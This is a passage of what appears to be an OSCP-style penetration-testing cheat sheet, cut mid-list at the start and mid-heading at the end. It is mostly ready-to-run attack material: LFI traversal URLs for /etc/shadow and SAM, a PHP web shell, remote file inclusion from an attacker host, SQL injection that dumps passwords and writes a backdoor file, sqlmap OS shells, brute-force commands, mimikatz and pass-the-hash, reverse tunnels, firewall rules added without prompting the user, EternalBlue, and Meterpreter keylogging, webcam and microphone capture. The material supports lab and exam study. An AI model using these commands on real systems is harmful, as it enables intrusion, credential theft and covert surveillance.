Files:<br>&#x2F;etc&#x2F;issue<br>&#x2F;proc&#x2F;version<br>&#x2F;etc&#x2F;profile<br>&#x2F;etc&#x2F;passwd<br>&#x2F;etc&#x2F;passwd<br>&#x2F;etc&#x2F;shadow<br>&#x2F;root&#x2F;.bash_history<br>&#x2F;var&#x2F;log&#x2F;dmessage<br>&#x2F;var&#x2F;mail&#x2F;root<br>&#x2F;var&#x2F;spool&#x2F;cron&#x2F;crontabs&#x2F;root</p></li><li><p>LFI Windows Files:<br>%SYSTEMROOT%\repair\system<br>%SYSTEMROOT%\repair\SAM<br>%SYSTEMROOT%\repair\SAM<br>%WINDIR%\win.ini<br>%SYSTEMDRIVE%\boot.ini<br>%WINDIR%\Panther\sysprep.inf<br>%WINDIR%\system32\config\AppEvent.Evt</p></li><li><p>LFI OSX Files:<br>&#x2F;etc&#x2F;fstab<br>&#x2F;etc&#x2F;master.passwd<br>&#x2F;etc&#x2F;resolv.conf<br>&#x2F;etc&#x2F;sudoers<br>&#x2F;etc&#x2F;sysctl.conf</p></li><li><p>LFI - Download passwords file<br><a href="about:blank"><em>http:&#x2F;&#x2F;$ip&#x2F;index.php?page&#x3D;&#x2F;etc&#x2F;passwd</em></a><br><a href="about:blank"><em>http:&#x2F;&#x2F;$ip&#x2F;index.php?file&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd</em></a></p></li><li><p>LFI - Download passwords file with filter evasion<br><a href="about:blank"><em>http:&#x2F;&#x2F;$ip&#x2F;index.php?file&#x3D;..%2F..%2F..%2F..%2Fetc%2Fpasswd</em></a></p></li><li><p>Local File Inclusion - In versions of PHP below 5.3 we can<br>terminate with null byte<br>GET<br>&#x2F;addguestbook.php?name&#x3D;Haxor&amp;comment&#x3D;Merci!&amp;LANG&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;windows&#x2F;system32&#x2F;drivers&#x2F;etc&#x2F;hosts%00</p></li><li><p>Contaminating Log Files <code>&lt;?php echo shell_exec($_GET[&#39;cmd&#39;]);?&gt;</code></p></li><li><p>For a Remote File Inclusion look for php code that is not  sanitized and passed to the PHP include function and the php.ini<br>file must be configured to allow remote files</p><p><em>&#x2F;etc&#x2F;php5&#x2F;cgi&#x2F;php.ini</em> - “allow_url_fopen” and “allow_url_include” both set to “on”</p><p><code>include($_REQUEST[&quot;file&quot;].&quot;.php&quot;);</code></p></li><li><p>Remote File Inclusion</p><p> <code>http://192.168.11.35/addguestbook.php?name=a&amp;comment=b&amp;LANG=http://192.168.10.5/evil.txt </code></p><p> <code>&lt;?php echo shell\_exec(&quot;ipconfig&quot;);?&gt;</code></p></li></ul></li><li><h2 id="Database-Vulnerabilities"><a href="#Database-Vulnerabilities" class="headerlink" title="Database Vulnerabilities"></a><span id="_mgu7e3u7svak" class="anchor"><span id="_Toc480741820" class="anchor"></span></span>Database Vulnerabilities</h2><ul><li><p>Grab password hashes from a web application mysql database called “Users” - once you have the MySQL root username and        password</p><pre><code>  mysql -u root -p -h $ip  use &quot;Users&quot;  show tables;  select \* from users;</code></pre></li><li><p>Authentication Bypass</p><pre><code>  name=&#39;wronguser&#39; or 1=1;  name=&#39;wronguser&#39; or 1=1 LIMIT 1;</code></pre></li><li><p>Enumerating the Database</p><p><code>http://192.168.11.35/comment.php?id=738)&#39;</code></p><p>Verbose error message?</p><p><code>http://$ip/comment.php?id=738 order by 1</code></p><p><code>http://$ip/comment.php?id=738 union all select 1,2,3,4,5,6  </code></p><p>Determine MySQL Version:</p><p><code>http://$ip/comment.php?id=738 union all select 1,2,3,4,@@version,6  </code></p><p>Current user being used for the database connection:</p><p><code>http://$ip/comment.php?id=738 union all select 1,2,3,4,user(),6  </code></p><p>Enumerate database tables and column structures</p><p><code>http://$ip/comment.php?id=738 union all select 1,2,3,4,table_name,6 FROM information_schema.tables  </code></p><p>Target the users table in the database</p><p><code>http://$ip/comment.php?id=738 union all select 1,2,3,4,column_name,6 FROM information_schema.columns where        table_name=&#39;users&#39;  </code></p><p>Extract the name and password</p><p><code>http://$ip/comment.php?id=738 union select 1,2,3,4,concat(name,0x3a, password),6 FROM users </code></p><p>Create a backdoor</p><p><code>http://$ip/comment.php?id=738 union all select 1,2,3,4,&quot;&lt;?php echo shell_exec($_GET[&#39;cmd&#39;]);?&gt;&quot;,6 into OUTFILE        &#39;c:/xampp/htdocs/backdoor.php&#39;</code></p></li><li><p><strong>SQLMap Examples</strong></p></li><li><p>Crawl the links</p><p> <code>sqlmap -u http://$ip --crawl=1</code></p><p> <code>sqlmap -u http://meh.com --forms --batch --crawl=10 --cookie=jsessionid=54321 --level=5 --risk=3</code></p></li><li><p>SQLMap Search for databases against a suspected GET SQL Injection</p><p><code>sqlmap –u http://$ip/blog/index.php?search –dbs</code></p></li><li><p>SQLMap dump tables from database oscommerce at GET SQL injection</p><p><code>sqlmap –u http://$ip/blog/index.php?search= –dbs –D oscommerce –tables –dumps </code></p></li><li><p>SQLMap GET Parameter command</p><p> <code>sqlmap -u http://$ip/comment.php?id=738 --dbms=mysql --dump -threads=5  </code></p></li><li><p>SQLMap Post Username parameter</p><p>  <code>sqlmap -u http://$ip/login.php --method=POST --data=&quot;usermail=asc@dsd.com&amp;password=1231&quot; -p &quot;usermail&quot; --risk=3 --level=5 --dbms=MySQL --dump-all</code></p></li><li><p>SQL Map OS Shell</p><p>  <code>sqlmap -u http://$ip/comment.php?id=738 --dbms=mysql --osshell  </code></p><p>  <code>sqlmap -u http://$ip/login.php --method=POST --data=&quot;usermail=asc@dsd.com&amp;password=1231&quot; -p &quot;usermail&quot; --risk=3 --level=5 --dbms=MySQL --os-shell</code></p></li><li><p>Automated sqlmap scan</p><p> <code>sqlmap -u TARGET -p PARAM --data=POSTDATA --cookie=COOKIE --level=3 --current-user --current-db --passwords  --file-read=&quot;/var/www/blah.php&quot;</code></p></li></ul><pre><code>- Targeted sqlmap scan   `sqlmap -u &quot;http://meh.com/meh.php?id=1&quot; --dbms=mysql --tech=U --random-agent --dump` - Scan url for union + error based injection with mysql backend and use a random user agent + database dump    `sqlmap -o -u http://$ip/index.php --forms --dbs  `    `sqlmap -o -u &quot;http://$ip/form/&quot; --forms`  - Sqlmap check form for injection     `sqlmap -o -u &quot;http://$ip/vuln-form&quot; --forms -D database-name -T users --dump`   - Enumerate databases      `sqlmap --dbms=mysql -u &quot;$URL&quot; --dbs`    - Enumerate tables from a specific database      `sqlmap --dbms=mysql -u &quot;$URL&quot; -D &quot;$DATABASE&quot; --tables  `    - Dump table data from a specific database and table       `sqlmap --dbms=mysql -u &quot;$URL&quot; -D &quot;$DATABASE&quot; -T &quot;$TABLE&quot; --dump `    - Specify parameter to exploit       `sqlmap --dbms=mysql -u &quot;http://www.example.com/param1=value1&amp;param2=value2&quot; --dbs -p param2 `    - Specify parameter to exploit in &#39;nice&#39; URIs (exploits param1)        `sqlmap --dbms=mysql -u &quot;http://www.example.com/param1/value1*/param2/value2&quot; --dbs `    - Get OS shell         `sqlmap --dbms=mysql -u &quot;$URL&quot; --os-shell`    - Get SQL shell         `sqlmap --dbms=mysql -u &quot;$URL&quot; --sql-shell`     - SQL query        `sqlmap --dbms=mysql -u &quot;$URL&quot; -D &quot;$DATABASE&quot; --sql-query &quot;SELECT * FROM $TABLE;&quot;`     - Use Tor Socks5 proxy        `sqlmap --tor --tor-type=SOCKS5 --check-tor --dbms=mysql -u &quot;$URL&quot; --dbs`</code></pre></li><li><p><strong>NoSQLMap Examples</strong><br>   You may encounter NoSQL instances like MongoDB in your OSCP journies (<code>/cgi-bin/mongo/2.2.3/dbparse.py</code>).  NoSQLMap can help you to automate NoSQLDatabase enumeration.</p></li><li><p>NoSQLMap Installation</p><pre><code>  git clone https://github.com/codingo/NoSQLMap.git  cd NoSQLMap/  ls  pip install couchdb  pip install pbkdf2  pip install ipcalc  python nosqlmap.py --help</code></pre></li><li><h2 id="Password-Attacks"><a href="#Password-Attacks" class="headerlink" title="Password Attacks"></a>Password Attacks</h2><ul><li><p>AES Decryption<br><a href="http://aesencryption.net/">http://aesencryption.net/</a></p></li><li><p>Convert multiple webpages into a word list<br>for x in ‘index’ ‘about’ ‘post’ ‘contact’ ; do curl<br>http:&#x2F;&#x2F;$ip&#x2F;$x.html | html2markdown | tr -s ‘ ‘ ‘\n’ &gt;&gt;<br>webapp.txt ; done</p></li><li><p>Or convert html to word list dict<br>html2dic index.html.out | sort -u &gt; index-html.dict</p></li><li><p>Default Usernames and Passwords</p><ul><li><p>CIRT<br><a href="http://www.cirt.net/passwords"><em>http://www.cirt.net/passwords</em></a></p></li><li><p>Government Security - Default Logins and Passwords for<br>Networked Devices</p></li><li><p><a href="http://www.governmentsecurity.org/articles/DefaultLoginsandPasswordsforNetworkedDevices.php"><em>http://www.governmentsecurity.org/articles/DefaultLoginsandPasswordsforNetworkedDevices.php</em></a></p></li><li><p>Virus.org<br><a href="http://www.virus.org/default-password/"><em>http://www.virus.org/default-password/</em></a></p></li><li><p>Default Password<br><a href="http://www.defaultpassword.com/"><em>http://www.defaultpassword.com/</em></a></p></li></ul></li><li><p>Brute Force</p><ul><li><p>Nmap Brute forcing Scripts<br><a href="https://nmap.org/nsedoc/categories/brute.html"><em>https://nmap.org/nsedoc/categories/brute.html</em></a></p></li><li><p>Nmap Generic auto detect brute force attack<br>nmap –script brute -Pn &lt;target.com or ip&gt;</p><enter></li><li><p>MySQL nmap brute force attack<br>nmap –script&#x3D;mysql-brute $ip</p></li></ul></li><li><p>Dictionary Files</p><ul><li>Word lists on Kali<br>cd &#x2F;usr&#x2F;share&#x2F;wordlists</li></ul></li><li><p>Key-space Brute Force</p><ul><li><p>crunch 6 6 0123456789ABCDEF -o crunch1.txt</p></li><li><p>crunch 4 4 -f &#x2F;usr&#x2F;share&#x2F;crunch&#x2F;charset.lst mixalpha</p></li><li><p>crunch 8 8 -t ,@@^^%%%</p></li></ul></li><li><p>Pwdump and Fgdump - Security Accounts Manager (SAM)</p><ul><li><p>pwdump.exe - attempts to extract password hashes</p></li><li><p>fgdump.exe - attempts to kill local antiviruses before<br>attempting to dump the password hashes and<br>cached credentials.</p></li></ul></li><li><p>Windows Credential Editor (WCE)</p><ul><li><p>allows one to perform several attacks to obtain clear text<br>passwords and hashes</p></li><li><p>wce -w</p></li></ul></li><li><p>Mimikatz</p><ul><li>extract plaintexts passwords, hash, PIN code and kerberos<br>tickets from memory. mimikatz can also perform<br>pass-the-hash, pass-the-ticket or build Golden tickets<br><a href="https://github.com/gentilkiwi/mimikatz"><em>https://github.com/gentilkiwi/mimikatz</em></a><br>From metasploit meterpreter (must have System level access):<br><code>meterpreter&gt; load mimikatz meterpreter&gt; help mimikatz meterpreter&gt; msv meterpreter&gt; kerberos meterpreter&gt; mimikatz_command -f samdump::hashes meterpreter&gt; mimikatz_command -f sekurlsa::searchPasswords</code></li></ul></li><li><p>Password Profiling</p><ul><li>cewl can generate a password list from a web page<br><code>cewl www.megacorpone.com -m 6 -w megacorp-cewl.txt</code></li></ul></li><li><p>Password Mutating</p><ul><li>John the ripper can mutate password lists<br>nano &#x2F;etc&#x2F;john&#x2F;john.conf<br><code>john --wordlist=megacorp-cewl.txt --rules --stdout &gt; mutated.txt</code></li></ul></li><li><p>Medusa</p><ul><li>Medusa, initiated against an htaccess protected web<br>directory<br><code>medusa -h $ip -u admin -P password-file.txt -M http -m DIR:/admin -T 10</code></li></ul></li><li><p>Ncrack</p><ul><li>ncrack (from the makers of nmap) can brute force RDP<br><code>ncrack -vv --user offsec -P password-file.txt rdp://$ip</code></li></ul></li><li><p>Hydra</p><ul><li><p>Hydra brute force against SNMP<br><code>hydra -P password-file.txt -v $ip snmp</code></p></li><li><p>Hydra FTP known user and password list<br><code>hydra -t 1 -l admin -P /root/Desktop/password.lst -vV $ip ftp</code></p></li><li><p>Hydra SSH using list of users and passwords<br><code>hydra -v -V -u -L users.txt -P passwords.txt -t 1 -u $ip ssh</code></p></li><li><p>Hydra SSH using a known password and a username list<br><code>hydra -v -V -u -L users.txt -p &quot;&lt;known password&gt;&quot; -t 1 -u $ip ssh</code></p></li><li><p>Hydra SSH Against Known username on port 22<br><code>hydra $ip -s 22 ssh -l &lt;user&gt; -P big\_wordlist.txt</code></p></li><li><p>Hydra POP3 Brute Force<br><code>hydra -l USERNAME -P /usr/share/wordlistsnmap.lst -f $ip pop3 -V</code></p></li><li><p>Hydra SMTP Brute Force<br><code>hydra -P /usr/share/wordlistsnmap.lst $ip smtp -V</code></p></li><li><p>Hydra attack http get 401 login with a dictionary<br><code>hydra -L ./webapp.txt -P ./webapp.txt $ip http-get /admin</code></p></li><li><p>Hydra attack Windows Remote Desktop with rockyou<br><code>hydra -t 1 -V -f -l administrator -P /usr/share/wordlists/rockyou.txt rdp://$ip</code></p></li><li><p>Hydra brute force a Wordpress admin login<br><code>hydra -l admin -P ./passwordlist.txt $ip -V http-form-post &#39;/wp-login.php:log=^USER^&amp;pwd=^PASS^&amp;wp-submit=Log In&amp;testcookie=1:S=Location&#39;</code></p></li></ul></li></ul></li><li><h2 id="Password-Hash-Attacks"><a href="#Password-Hash-Attacks" class="headerlink" title="Password Hash Attacks"></a><span id="_bnmnt83v58wk" class="anchor"><span id="_Toc480741822" class="anchor"></span></span>Password Hash Attacks</h2><ul><li><p>Online Password Cracking<br><a href="https://crackstation.net/"><em>https://crackstation.net/</em></a></p></li><li><p>Hashcat</p></li></ul></li></ul><p>   Needed to install new drivers to get my GPU Cracking to work on the Kali linux VM and I also had to use the –force parameter.<br>apt-get install libhwloc-dev ocl-icd-dev ocl-icd-opencl-dev<br>and<br>apt-get install pocl-opencl-icd</p><p>   Cracking Linux Hashes - &#x2F;etc&#x2F;shadow file<br>   <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">500 | md5crypt $1$, MD5(Unix)                          | Operating-Systems</span><br><span class="line">3200 | bcrypt $2*$, Blowfish(Unix)                      | Operating-Systems</span><br><span class="line">7400 | sha256crypt $5$, SHA256(Unix)                    | Operating-Systems</span><br><span class="line">1800 | sha512crypt $6$, SHA512(Unix)                    | Operating-Systems</span><br></pre></td></tr></table></figure><br>   Cracking Windows Hashes<br>   <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">3000 | LM                                               | Operating-Systems</span><br><span class="line">1000 | NTLM                                             | Operating-Systems</span><br></pre></td></tr></table></figure><br>   Cracking Common Application Hashes<br>   <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">  900 | MD4                                              | Raw Hash</span><br><span class="line">    0 | MD5                                              | Raw Hash</span><br><span class="line"> 5100 | Half MD5                                         | Raw Hash</span><br><span class="line">  100 | SHA1                                             | Raw Hash</span><br><span class="line">10800 | SHA-384                                          | Raw Hash</span><br><span class="line"> 1400 | SHA-256                                          | Raw Hash</span><br><span class="line"> 1700 | SHA-512                                          | Raw Hash</span><br></pre></td></tr></table></figure></p><p>   Create a .hash file with all the hashes you want to crack<br>   puthasheshere.hash:<br>   <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$1$O3JMY.Tw$AdLnLjQ/5jXF9.MTp3gHv/</span><br></pre></td></tr></table></figure></p><p>   Hashcat example cracking Linux md5crypt passwords $1$ using rockyou:</p><p>   <code>hashcat --force -m 500 -a 0 -o found1.txt --remove puthasheshere.hash /usr/share/wordlists/rockyou.txt</code></p><p>   Wordpress sample hash: $P$B55D6LjfHDkINU5wF.v2BuuzO0&#x2F;XPk&#x2F;</p><p>   Wordpress clear text: test</p><p>   Hashcat example cracking Wordpress passwords using rockyou:</p><p>  <code>hashcat --force -m 400 -a 0 -o found1.txt --remove wphash.hash /usr/share/wordlists/rockyou.txt</code></p><pre><code>-   Sample Hashes    [*http://openwall.info/wiki/john/sample-hashes*](http://openwall.info/wiki/john/sample-hashes)-   Identify Hashes    `hash-identifier`-   To crack linux hashes you must first unshadow them:    `unshadow passwd-file.txt shadow-file.txt  `    `unshadow passwd-file.txt shadow-file.txt &gt; unshadowed.txt`</code></pre><ul><li><p>John the Ripper - Password Hash Cracking</p><ul><li><p><code>john $ip.pwdump</code></p></li><li><p><code>john --wordlist=/usr/share/wordlists/rockyou.txt hashes</code></p></li><li><p><code>john --rules --wordlist=/usr/share/wordlists/rockyou.txt</code></p></li><li><p><code>john --rules --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt</code></p></li><li><p>JTR forced descrypt cracking with wordlist</p><p><code>john --format=descrypt --wordlist  /usr/share/wordlists/rockyou.txt hash.txt</code></p></li><li><p>JTR forced descrypt brute force cracking</p><p><code>john --format=descrypt hash --show</code></p></li></ul></li><li><p>Passing the Hash in Windows</p><ul><li><p>Use Metasploit to exploit one of the SMB servers in the labs.<br>Dump the password hashes and attempt a pass-the-hash attack<br>against another system:</p><p><code>export SMBHASH=aad3b435b51404eeaad3b435b51404ee:6F403D3166024568403A94C3A6561896 </code></p><p><code>pth-winexe -U administrator //$ip cmd</code></p></li></ul></li></ul><h1 id="Networking-Pivoting-and-Tunneling"><a href="#Networking-Pivoting-and-Tunneling" class="headerlink" title="Networking, Pivoting and Tunneling"></a><span id="_6nmbgmpltwon" class="anchor"><span id="_Toc480741823" class="anchor"></span></span>Networking, Pivoting and Tunneling</h1><ul><li><p>Port Forwarding - accept traffic on a given IP address and port and<br>redirect it to a different IP address and port</p><ul><li><p><code>apt-get install rinetd</code></p></li><li><p><code>cat /etc/rinetd.conf  </code><br><code>\# bindadress bindport connectaddress connectport </code><br><code>w.x.y.z 53 a.b.c.d 80</code></p></li></ul></li><li><p>SSH Local Port Forwarding: supports bi-directional communication<br>channels</p><ul><li><code>ssh &lt;gateway&gt; -L &lt;local port to listen&gt;:&lt;remote host&gt;:&lt;remote port&gt;</code></li></ul></li><li><p>SSH Remote Port Forwarding: Suitable for popping a remote shell on<br>an internal non routable network</p><ul><li><code>ssh &lt;gateway&gt; -R &lt;remote port to bind&gt;:&lt;local host&gt;:&lt;local port&gt;</code></li></ul></li><li><p>SSH Dynamic Port Forwarding: create a SOCKS4 proxy on our local<br>attacking box to tunnel ALL incoming traffic to ANY host in the DMZ<br>network on ANY PORT</p><ul><li><code>ssh -D &lt;local proxy port&gt; -p &lt;remote port&gt; &lt;target&gt;</code></li></ul></li><li><p>Proxychains - Perform nmap scan within a DMZ from an external<br>computer</p><ul><li><p>Create reverse SSH tunnel from Popped machine on :2222</p><p><code>ssh -f -N -T -R22222:localhost:22 yourpublichost.example.com</code><br><code>ssh -f -N -R 2222:&lt;local host&gt;:22 root@&lt;remote host&gt;</code></p></li><li><p>Create a Dynamic application-level port forward on 8080 thru<br>2222</p><p><code>ssh -f -N -D &lt;local host&gt;:8080 -p 2222 hax0r@&lt;remote host&gt;</code></p></li><li><p>Leverage the SSH SOCKS server to perform Nmap scan on network<br>using proxy chains</p><p><code>proxychains nmap --top-ports=20 -sT -Pn $ip/24</code></p></li></ul></li><li><p>HTTP Tunneling</p><p>  <code>nc -vvn $ip 8888</code></p></li><li><p>Traffic Encapsulation - Bypassing deep packet inspection</p><ul><li>http tunnel<br>On server side:<br><code>sudo hts -F &lt;server ip addr&gt;:&lt;port of your app&gt; 80  </code><br>On client side:<br><code>sudo htc -P &lt;my proxy.com:proxy port&gt; -F &lt;port of your app&gt; &lt;server ip addr&gt;:80 stunnel</code></li></ul></li><li><p>Tunnel Remote Desktop (RDP) from a Popped Windows machine to your<br>network</p><ul><li><p>Tunnel on port 22</p><p><code>plink -l root -pw pass -R 3389:&lt;localhost&gt;:3389 &lt;remote host&gt;</code></p></li><li><p>Port 22 blocked? Try port 80? or 443?</p><p><code>plink -l root -pw 23847sd98sdf987sf98732 -R 3389:&lt;local host&gt;:3389 &lt;remote host&gt; -P80</code></p></li></ul></li><li><p>Tunnel Remote Desktop (RDP) from a Popped Windows using HTTP Tunnel<br>(bypass deep packet inspection)</p><ul><li><p>Windows machine add required firewall rules without prompting the user</p></li><li><p><code>netsh advfirewall firewall add rule name=&quot;httptunnel_client&quot; dir=in action=allow program=&quot;httptunnel_client.exe&quot; enable=yes</code></p></li><li><p><code>netsh advfirewall firewall add rule name=&quot;3000&quot; dir=in action=allow protocol=TCP localport=3000</code></p></li><li><p><code>netsh advfirewall firewall add rule name=&quot;1080&quot; dir=in action=allow protocol=TCP localport=1080</code></p></li><li><p><code>netsh advfirewall firewall add rule name=&quot;1079&quot; dir=in action=allow protocol=TCP localport=1079</code></p></li><li><p>Start the http tunnel client</p><p> <code>httptunnel_client.exe</code></p></li><li><p>Create HTTP reverse shell by connecting to localhost port 3000</p><p><code>plink -l root -pw 23847sd98sdf987sf98732 -R 3389:&lt;local host&gt;:3389 &lt;remote host&gt; -P 3000</code></p></li></ul></li><li><p>VLAN Hopping</p><ul><li><code>git clone https://github.com/nccgroup/vlan-hopping.git chmod 700 frogger.sh ./frogger.sh</code></li></ul></li><li><p>VPN Hacking</p><ul><li><p>Identify VPN servers:<br><code>./udp-protocol-scanner.pl -p ike $ip</code></p></li><li><p>Scan a range for VPN servers:<br><code>./udp-protocol-scanner.pl -p ike -f ip.txt</code></p></li><li><p>Use IKEForce to enumerate or dictionary attack VPN servers:</p><p><code>pip install pyip</code></p><p><code>git clone https://github.com/SpiderLabs/ikeforce.git  </code></p><p>Perform IKE VPN enumeration with IKEForce:</p><p><code>./ikeforce.py TARGET-IP –e –w wordlists/groupnames.dic  </code></p><p>Bruteforce IKE VPN using IKEForce:</p><p><code>./ikeforce.py TARGET-IP -b -i groupid -u dan -k psk123 -w passwords.txt -s 1  </code><br>Use ike-scan to capture the PSK hash:</p><p><code>ike-scan ike-scan TARGET-IP ike-scan -A TARGET-IP ike-scan -A TARGET-IP --id=myid -P TARGET-IP-key ike-scan –M –A –n example\_group -P hash-file.txt TARGET-IP  </code><br>Use psk-crack to crack the PSK hash</p><p><code>psk-crack hash-file.txt pskcrack psk-crack -b 5 TARGET-IPkey psk-crack -b 5 --charset=&quot;01233456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz&quot; 192-168-207-134key psk-crack -d /path/to/dictionary-file TARGET-IP-key</code></p></li></ul></li><li><p>PPTP Hacking</p><ul><li><p>Identifying PPTP, it listens on TCP: 1723<br>NMAP PPTP Fingerprint:</p><p><code>nmap –Pn -sV -p 1723 TARGET(S)  </code><br>PPTP Dictionary Attack</p><p><code>thc-pptp-bruter -u hansolo -W -w /usr/share/wordlists/nmap.lst</code></p></li></ul></li><li><p>Port Forwarding&#x2F;Redirection</p></li><li><p>PuTTY Link tunnel - SSH Tunneling</p><ul><li><p>Forward remote port to local address:</p><p> <code>plink.exe -P 22 -l root -pw &quot;1337&quot; -R 445:&lt;local host&gt;:445 &lt;remote host&gt;</code></p></li></ul></li><li><p>SSH Pivoting</p><ul><li><p>SSH pivoting from one network to another:</p><p><code>ssh -D &lt;local host&gt;:1010 -p 22 user@&lt;remote host&gt;</code></p></li></ul></li><li><p>DNS Tunneling</p><ul><li><p>dnscat2 supports “download” and “upload” commands for getting iles (data and programs) to and from the target machine.</p></li><li><p>Attacking Machine Installation:</p><p><code>apt-get update apt-get -y install ruby-dev git make g++ gem install bundler git clone https://github.com/iagox86/dnscat2.git cd dnscat2/server bundle install</code></p></li><li><p>Run dnscat2:</p><p><code>ruby ./dnscat2.rb dnscat2&gt; New session established: 1422 dnscat2&gt; session -i 1422</code></p></li><li><p>Target Machine:<br><a href="https://downloads.skullsecurity.org/dnscat2/">https://downloads.skullsecurity.org/dnscat2/</a><br><a href="https://github.com/lukebaggett/dnscat2-powershell/">https://github.com/lukebaggett/dnscat2-powershell/</a></p><p><code>dnscat --host &lt;dnscat server ip&gt;</code></p></li></ul></li></ul><h1 id="The-Metasploit-Framework"><a href="#The-Metasploit-Framework" class="headerlink" title="The Metasploit Framework"></a><span id="_ujpvtdpc9i67" class="anchor"><span id="_Toc480741824" class="anchor"></span></span>The Metasploit Framework</h1><ul><li><p>See <a href="https://www.offensive-security.com/metasploit-unleashed/"><em>Metasploit Unleashed<br>Course</em></a><br>in the Essentials</p></li><li><p>Search for exploits using Metasploit GitHub framework source code:<br><a href="https://github.com/rapid7/metasploit-framework"><em>https://github.com/rapid7/metasploit-framework</em></a><br>Translate them for use on OSCP LAB or EXAM.</p></li><li><p>Metasploit</p><ul><li><p>MetaSploit requires Postfresql</p><p><code>systemctl start postgresql</code></p></li><li><p>To enable Postgresql on startup</p><p><code>systemctl enable postgresql</code></p></li></ul></li><li><p>MSF Syntax</p><ul><li><p>Start metasploit</p><p><code>msfconsole  </code></p><p><code>msfconsole -q</code></p></li><li><p>Show help for command</p><p><code>show -h</code></p></li><li><p>Show Auxiliary modules</p><p><code>show auxiliary</code></p></li><li><p>Use a module</p><p><code>use auxiliary/scanner/snmp/snmp_enum use auxiliary/scanner/http/webdav_scanner use auxiliary/scanner/smb/smb_version use auxiliary/scanner/ftp/ftp_login use exploit/windows/pop3/seattlelab_pass</code></p></li><li><p>Show the basic information for a module</p><p><code>info</code></p></li><li><p>Show the configuration parameters for a module</p><p><code>show options</code></p></li><li><p>Set options for a module</p><p><code>set RHOSTS 192.168.1.1-254 set THREADS 10</code></p></li><li><p>Run the module</p><p><code>run</code></p></li><li><p>Execute an Exploit</p><p><code>exploit</code></p></li><li><p>Search for a module</p></li></ul><p>   <code>search type:auxiliary login</code></p></li><li><p>Metasploit Database Access</p><ul><li><p>Show all hosts discovered in the MSF database</p><p><code>hosts</code></p></li><li><p>Scan for hosts and store them in the MSF database</p><p><code>db_nmap</code></p></li><li><p>Search machines for specific ports in MSF database</p><p><code>services -p 443</code></p></li><li><p>Leverage MSF database to scan SMB ports (auto-completed rhosts)</p><p><code>services -p 443 --rhosts</code></p></li></ul></li><li><p>Staged and Non-staged</p><ul><li><p>Non-staged payload - is a payload that is sent in its entirety in one go</p></li><li><p>Staged - sent in two parts  Not have enough buffer space  Or need to bypass antivirus</p></li></ul></li><li><p>MS 17-010 - EternalBlue</p></li></ul><pre><code>-   You may find some boxes that are vulnerable to MS17-010 (AKA. EternalBlue).  Although, not offically part of the indended course, this exploit can be leveraged to gain SYSTEM level access to a Windows box.  I have never had much luck using the built in Metasploit EternalBlue module.  I found that the elevenpaths version works much more relabily. Here are the instructions to install it taken from the following YouTube video:https://www.youtube.com/watch?v=4OHLor9VaRI  1. First step is to configure the Kali to work with wine 32bit  `dpkg --add-architecture i386 &amp;&amp; apt-get update &amp;&amp; apt-get install wine32  rm -r ~/.wine  wine cmd.exe  exit`  2. Download the exploit repostory  https://github.com/ElevenPaths/Eternalblue-Doublepulsar-Metasploit  3. Move the exploit to /usr /share /metasploit-framework /modules /exploits /windows /smb  4. Start metasploit console</code></pre><p>I found that using spoolsv.exe as the PROCESSINJECT yielded results on OSCP boxes.</p><pre><code>  `use exploit/windows/smb/eternalblue_doublepulsar  msf exploit(eternalblue_doublepulsar) &gt; set RHOST 10.10.10.10  RHOST =&gt; 10.11.1.73  msf exploit(eternalblue_doublepulsar) &gt; set PROCESSINJECT spoolsv.exe  PROCESSINJECT =&gt; spoolsv.exe  msf exploit(eternalblue_doublepulsar) &gt; run`</code></pre><ul><li><p>Experimenting with Meterpreter</p><ul><li><p>Get system information from Meterpreter Shell</p><p><code>sysinfo</code></p></li><li><p>Get user id from Meterpreter Shell</p><p><code>getuid</code></p></li><li><p>Search for a file</p><p><code>search -f *pass*.txt</code></p></li><li><p>Upload a file</p><p><code>upload /usr/share/windows-binaries/nc.exe c:\\Users\\Offsec</code></p></li><li><p>Download a file</p><p><code>download c:\\Windows\\system32\\calc.exe /tmp/calc.exe</code></p></li><li><p>Invoke a command shell from Meterpreter Shell</p><p><code>shell</code></p></li><li><p>Exit the meterpreter shell</p><p><code>exit</code></p></li></ul></li><li><p>Metasploit Exploit Multi Handler</p><ul><li><p>multi&#x2F;handler to accept an incoming reverse_https_meterpreter</p><p><code>payload use exploit/multi/handler set PAYLOAD windows/meterpreter/reverse_https set LHOST $ip set LPORT 443 exploit [*] Started HTTPS reverse handler on https://$ip:443/</code></p></li></ul></li><li><p>Building Your Own MSF Module</p><ul><li><code>mkdir -p ~/.msf4/modules/exploits/linux/misc cd ~/.msf4/modules/exploits/linux/misc cp /usr/share/metasploitframework/modules/exploits/linux/misc/gld\_postfix.rb ./crossfire.rb nano crossfire.rb</code></li></ul></li><li><p>Post Exploitation with Metasploit - (available options depend on OS and Meterpreter Cababilities)</p><ul><li><code>download</code> Download a file or directory<br><code>upload</code> Upload a file or directory<br><code>portfwd</code> Forward a local port to a remote service<br><code>route</code> View and modify the routing table<br><code>keyscan_start</code> Start capturing keystrokes<br><code>keyscan_stop</code> Stop capturing keystrokes<br><code>screenshot</code> Grab a screenshot of the interactive desktop<br><code>record_mic</code> Record audio from the default microphone for X seconds<br><code>webcam_snap</code> Take a snapshot from the specified webcam<br><code>getsystem</code> Attempt to elevate your privilege to that of local system.<br><code>hashdump</code> Dumps the contents of the SAM database</li></ul></li><li><p>Meterpreter Post Exploitation Features</p><ul><li><p>Create a Meterpreter background session</p><p><code>background</code></p></li></ul></li></ul><h1 id="Bypassing-Antivirus-Software"><a href="#Bypassing-Antivirus-Software" class="headerlink" title="Bypassing Antivirus Software"></a><span id="_51btodqc88s2" class="anchor"><span id="_Toc480741825" class="anchor"></span></span>Bypassing Antivirus 